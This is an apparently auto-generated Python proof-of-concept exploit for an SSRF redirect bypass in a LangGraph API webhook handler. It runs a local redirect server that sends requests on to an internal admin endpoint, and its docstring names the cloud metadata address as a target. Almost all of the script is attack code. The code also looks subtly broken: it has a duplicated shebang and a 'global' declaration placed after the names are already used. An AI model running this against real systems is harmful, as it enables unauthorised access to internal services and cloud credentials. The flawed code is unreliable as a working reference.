#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-020
# Sink: ssrf_safe_async_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_ssrf_safe_async_client_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api_src

Vulnerability: The webhook URL is user-controlled and validated only at ingestion.
However, the HTTP client follows redirects (follow_redirects=True) without re-validating
the redirect target. An attacker can host a server that redirects to internal IPs
(e.g., 127.0.0.1, 169.254.169.254) after the initial validation passes.

This PoC demonstrates the bypass by:
1. Starting a local HTTP server that redirects to an internal endpoint
2. Sending a request to the vulnerable webhook endpoint with the redirector URL
3. Showing that the internal endpoint is accessed despite SSRF protections

Requirements: Python 3.7+, requests, threading (stdlib)
"""

import argparse
import json
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, urlunparse

import requests

# Configuration
LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9999
INTERNAL_TARGET = "http://127.0.0.1:8080/admin"  # Example internal endpoint
REDIRECT_STATUS = 302  # Use 302 for redirect

class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that redirects to an internal target."""
    
    def do_GET(self):
        self.send_response(REDIRECT_STATUS)
        self.send_header("Location", INTERNAL_TARGET)
        self.end_headers()
    
    def do_POST(self):
        # Handle POST requests (webhook typically uses POST)
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else b""
        
        print(f"[*] Received POST request from {self.client_address}")
        print(f"[*] Headers: {dict(self.headers)}")
        if body:
            print(f"[*] Body: {body[:200]}...")  # Truncate long bodies
        
        self.send_response(REDIRECT_STATUS)
        self.send_header("Location", INTERNAL_TARGET)
        self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

def start_redirect_server():
    """Start a simple HTTP server that redirects to internal target."""
    server = HTTPServer((LISTEN_HOST, LISTEN_PORT), RedirectHandler)
    print(f"[*] Redirect server listening on {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] Will redirect to: {INTERNAL_TARGET}")
    server.serve_forever()

def exploit(target_url, redirector_url):
    """
    Attempt SSRF bypass by sending a webhook request through a redirector.
    
    Args:
        target_url: The vulnerable webhook endpoint (e.g., http://victim:8000/webhook)
        redirector_url: URL of our redirect server (e.g., http://attacker:9999/redirect)
    """
    print(f"[*] Target webhook URL: {target_url}")
    print(f"[*] Redirector URL: {redirector_url}")
    print(f"[*] Internal target to access: {INTERNAL_TARGET}")
    
    # Prepare the webhook payload
    payload = {
        "webhook": redirector_url,
        "checkpoint": {"values": {"test": "poc"}},
        "run": {"run_id": "test-poc-12345"},
        "status": "completed",
        "run_started_at": "2024-01-01T00:00:00",
        "run_ended_at": "2024-01-01T00:01:00",
        "exception": None
    }
    
    try:
        print("[*] Sending webhook request...")
        response = requests.post(
            target_url,
            json=payload,
            timeout=10,
            allow_redirects=False  # We handle redirects manually for visibility
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response headers: {dict(response.headers)}")
        print(f"[*] Response body: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] Webhook request succeeded!")
            print("[!] If the redirect was followed, internal service was accessed")
        elif response.status_code in (301, 302, 307, 308):
            print(f"[*] Got redirect to: {response.headers.get('Location')}")
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        print("[*] Make sure the target server is running")
    except requests.exceptions.Timeout as e:
        print(f"[-] Timeout: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api_src"
    )
    parser.add_argument(
        "target",
        help="Vulnerable webhook endpoint URL (e.g., http://localhost:8000/webhook)"
    )
    parser.add_argument(
        "--redirector-port",
        type=int,
        default=LISTEN_PORT,
        help=f"Port for redirect server (default: {LISTEN_PORT})"
    )
    parser.add_argument(
        "--internal-target",
        default=INTERNAL_TARGET,
        help=f"Internal target to access (default: {INTERNAL_TARGET})"
    )
    parser.add_argument(
        "--no-server",
        action="store_true",
        help="Don't start redirect server (use existing one)"
    )
    
    args = parser.parse_args()
    
    # Update configuration
    global LISTEN_PORT, INTERNAL_TARGET
    LISTEN_PORT = args.redirector_port
    INTERNAL_TARGET = args.internal_target
    
    # Build redirector URL
    redirector_url = f"http://{LISTEN_HOST}:{LISTEN_PORT}/webhook"
    
    if not args.no_server:
        # Start redirect server in background thread
        server_thread = threading.Thread(target=start_redirect_server, daemon=True)
        server_thread.start()
        print("[*] Redirect server started in background")
        time.sleep(0.5)  # Give server time to start
    
    # Run exploit
    exploit(args.target, redirector_url)
    
    if not args.no_server:
        print("\n[*] Press Ctrl+C to stop the redirect server")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")

if __name__ == "__main__":
    main()
